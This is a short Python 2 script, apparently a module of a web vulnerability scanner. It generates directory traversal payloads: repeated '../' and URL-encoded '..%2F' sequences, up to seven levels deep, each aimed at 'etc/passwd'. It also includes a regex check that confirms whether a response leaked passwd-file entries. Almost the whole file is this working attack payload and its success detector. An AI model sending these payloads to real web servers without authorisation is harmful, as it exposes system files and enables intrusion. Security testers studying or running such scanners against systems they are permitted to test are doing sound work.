
import itertools
import re

## add %2F in case of parameter escape

def get_all(depth_count=8):
	paths = []
	dotvar = ["../","..%2F"]
	for i in range(1, depth_count):
		for j in dotvar:
			paths.append(i* j)

	payload = "etc/passwd"

	payloads = [(item + payload, "Directory Traversal") for item in paths]
	return payloads

def checkSuccess(html):
	match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
	if len(match) == 0:
		return False
	return True
	
if __name__ == "__main__":	
	print get_all()
